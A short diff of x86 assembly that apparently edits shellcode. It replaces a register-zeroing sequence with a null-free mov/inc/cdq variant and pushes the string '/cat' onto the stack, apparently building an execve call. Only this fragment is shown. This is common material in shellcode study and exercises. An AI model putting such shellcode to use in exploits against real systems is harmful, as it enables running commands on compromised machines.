@@ -2,8 +2,9 @@
 global _start
 section .text
 _start:
-        mov edx, -1
-        inc edx
+        mov eax, -1		; put 0xfffff in eax
+        inc eax			; eax becomes zero
+        cdq			; zeroes edx
         lea ebx, [esp-0xc]
         push edx
         push dword 0x7461632f   ; tac/
